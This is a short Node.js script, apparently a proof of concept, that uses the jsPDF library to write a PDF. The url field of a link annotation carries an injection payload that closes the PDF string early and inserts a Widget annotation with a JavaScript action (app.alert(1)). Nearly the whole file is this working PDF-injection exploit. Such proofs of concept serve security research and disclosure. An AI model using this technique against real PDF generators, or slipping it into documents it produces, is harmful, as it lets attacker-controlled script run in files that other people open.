const {jsPDF} = require("jspdf");
var doc = new jsPDF();
doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(A)>>/A<</S/JavaScript/JS(app.alert(1))/(`});
doc.text(20, 20, 'Test text');
doc.save("output.pdf");
